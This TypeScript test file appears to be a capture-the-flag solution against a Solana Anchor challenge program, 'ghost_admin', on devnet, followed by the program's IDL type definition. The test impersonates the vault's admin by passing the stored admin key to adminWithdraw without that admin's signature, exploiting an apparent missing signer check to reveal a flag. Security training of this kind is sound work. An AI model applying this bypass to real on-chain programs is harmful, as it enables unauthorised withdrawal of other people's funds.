import { AnchorProvider, Program, Wallet } from '@coral-xyz/anchor';
import { Connection, Keypair, PublicKey, sendAndConfirmTransaction, Transaction } from '@solana/web3.js';
import idl from "../ghost_admin.json" with { type: "json" }
import { bs58 } from '@coral-xyz/anchor/dist/cjs/utils/bytes';
import { test } from 'mocha';


describe("Ghost test", () => {

    const connection = new Connection('https://api.devnet.solana.com'); // or devnet/localnet
    const secretKey = bs58.decode("") // Enter your secret key here
    const keypair = Keypair.fromSecretKey(new Uint8Array(secretKey))
    const wallet = {
        publicKey: keypair.publicKey,
        signTransaction: async (tx) => tx,
        signAllTransactions: async (txs) => txs,
    } as Wallet;
    
    const provider = new AnchorProvider(connection, wallet, AnchorProvider.defaultOptions());
    const program = new Program<GhostAdmin>(idl, provider);


    test("Test", async () => {
        const vaultPubkey = PublicKey.findProgramAddressSync([Buffer.from("vault")], program.programId)[0]

        const vault = await program.account.vault.fetch(vaultPubkey)

        console.log(vault.admin.toString())

        
        const tx = new Transaction().add(
            await program.methods.adminWithdraw()
                .accountsStrict({
                    admin: vault.admin,
                    vault: vaultPubkey
                }).instruction()
        )

        tx.feePayer = keypair.publicKey;
        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        const sig = await sendAndConfirmTransaction(connection, tx, [keypair], {
            skipPreflight: true,
            commitment: "finalized",
        })
        /// open this signature in solscan or something, and you'll see a log with a flag
        console.log("Sig::",sig)

    })

})

/**
 * Program IDL in camelCase format in order to be used in JS/TS.
 *
 * Note that this is only a type helper and is not the actual IDL. The original
 * IDL can be found at `target/idl/ghost_admin.json`.
 */
export type GhostAdmin = {
    "address": "As9phEyQ89EecwUXtcVuJcwsvF2vspa7Je8qha7cDS25",
    "metadata": {
      "name": "ghostAdmin",
      "version": "0.1.0",
      "spec": "0.1.0",
      "description": "Created with Anchor"
    },
    "instructions": [
      {
        "name": "adminWithdraw",
        "discriminator": [
          160,
          166,
          147,
          222,
          46,
          220,
          75,
          224
        ],
        "accounts": [
          {
            "name": "admin"
          },
          {
            "name": "vault",
            "pda": {
              "seeds": [
                {
                  "kind": "const",
                  "value": [
                    118,
                    97,
                    117,
                    108,
                    116
                  ]
                }
              ]
            }
          }
        ],
        "args": []
      }
    ],
    "accounts": [
      {
        "name": "vault",
        "discriminator": [
          211,
          8,
          232,
          43,
          2,
          152,
          117,
          119
        ]
      }
    ],
    "errors": [
      {
        "code": 6000,
        "name": "unauthorized",
        "msg": "Only the admin can reveal the flag"
      }
    ],
    "types": [
      {
        "name": "vault",
        "type": {
          "kind": "struct",
          "fields": [
            {
              "name": "admin",
              "type": "pubkey"
            }
          ]
        }
      }
    ]
  };
  